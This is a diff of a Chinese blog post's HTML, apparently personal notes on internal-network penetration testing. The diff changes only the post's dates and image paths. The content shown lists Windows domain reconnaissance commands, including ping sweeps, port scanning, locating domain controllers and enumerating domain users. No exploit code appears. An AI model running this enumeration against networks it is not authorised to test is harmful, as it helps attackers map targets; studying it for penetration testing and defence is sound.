@@ -19,66 +19,66 @@
     <meta name="description" content="0x00  前言此笔记仅为作者学习及工作记录。什么是内网渗透：– 内网是一个只有组织工作人员才能访问的专用网络，简而言之就是不可简单地通过外部公网ip进行访问到的公司内部网络。对于一个大型公司的网络系统，通过信息收集找到网站漏洞可以顺利通过公网进入公司内部网络时，进一步对公司内部网络的渗透攻击即为内网渗透。 与外网渗透区别：1、外网渗透更侧重于找漏洞寻找突破口，考验的是白帽的综合能力，外网渗透的最">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网渗透总结">
-<meta property="og:url" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:url" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="一只鲶鱼">
 <meta property="og:description" content="0x00  前言此笔记仅为作者学习及工作记录。什么是内网渗透：– 内网是一个只有组织工作人员才能访问的专用网络，简而言之就是不可简单地通过外部公网ip进行访问到的公司内部网络。对于一个大型公司的网络系统，通过信息收集找到网站漏洞可以顺利通过公网进入公司内部网络时，进一步对公司内部网络的渗透攻击即为内网渗透。 与外网渗透区别：1、外网渗透更侧重于找漏洞寻找突破口，考验的是白帽的综合能力，外网渗透的最">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/002.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/003.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/004.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/005.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/006.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/007.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/008.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/009.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/010.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/011.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/012.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/013.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/014.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/015.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/016.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/017.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/018.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/019.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/020.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/021.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/022.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/023.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/024.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/025.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/026.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/027.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/028.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/029.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/030.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/031.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/032.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/033.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/034.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/035.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/036.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/037.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/038.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/039.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/040.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/041.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/042.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/043.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/044.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/045.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/046.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/047.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/048.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/049.png">
-<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/050.png">
-<meta property="article:published_time" content="2024-07-26T04:00:11.000Z">
-<meta property="article:modified_time" content="2025-03-05T06:38:25.390Z">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/002.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/003.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/004.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/005.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/006.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/007.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/008.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/009.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/010.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/011.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/012.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/013.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/014.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/015.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/016.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/017.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/018.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/019.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/020.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/021.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/022.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/023.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/024.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/025.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/026.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/027.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/028.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/029.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/030.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/031.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/032.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/033.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/034.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/035.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/036.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/037.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/038.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/039.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/040.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/041.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/042.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/043.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/044.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/045.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/046.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/047.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/048.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/049.png">
+<meta property="og:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/050.png">
+<meta property="article:published_time" content="2023-09-26T04:00:11.000Z">
+<meta property="article:modified_time" content="2025-07-02T05:59:38.298Z">
 <meta property="article:author" content="CNAQ">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png">
+<meta name="twitter:image" content="http://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png">
   
   
   
@@ -288,8 +288,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-26 12:00" pubdate>
-          2024年7月26日 中午
+        <time datetime="2023-09-26 12:00" pubdate>
+          2023年9月26日 中午
         </time>
       </span>
     
@@ -394,111 +394,111 @@
 <li><h6 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h6><p><strong>判断是否有域的几种方法:</strong></p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span>：<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">System</span>info：<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/002.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/002.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <pre><code class="hljs"> 如果显示workgroup则不在域里面：
 </code></pre>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/003.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/003.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain  （这个有三种情况）：<br></code></pre></td></tr></table></figure>
 
 <p>​		1、存在域并且当前用户是域用户  ：</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/004.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/004.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>​		2、存在域，当前用户不是域用户:</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/005.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/005.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p>​		3、不存在域:</p>
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/006.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/006.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config workstation   查看当前登录域:<br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/007.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/007.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p> <strong>利用 netbios 探测主机存活:</strong><br>工具：nbtscan<br><strong>利用 icmp 协议探测内网:</strong></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> 命令：for /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">110</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/008.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一"></li>
+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/008.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一"></li>
 </ol>
 <p><strong>利用 arp 扫描探测内网:</strong><br>   工具：arp-scan</p>
 <p>​	arp.exe -t IP</p>
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/009.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/009.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 <p> <strong>域内端口扫描:</strong><br>   telnet 命令扫描</p>
 <p>   metasploit 端口扫描模块：auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</p>
 <p>   端口利用速查：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iAmSoScArEd/p/10564262.html">https://www.cnblogs.com/iAmSoScArEd/p/10564262.html</a></p>
 <p> <strong>查找域控制器：</strong></p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">nltest <span class="hljs-string">/DCLIST</span>:域名<br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/010.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/010.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Domain</span> Controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/011.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/011.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netdom query pdc</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/012.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/012.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=SRV \<span class="hljs-variable">_LDAP</span>.\<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/013.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/013.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 
 
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/014.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/014.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <p> <strong>获取域内用户和管理员：</strong><br>   查询所有域用户列表：</p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure>
 
-   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/015.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
+   <img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/015.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
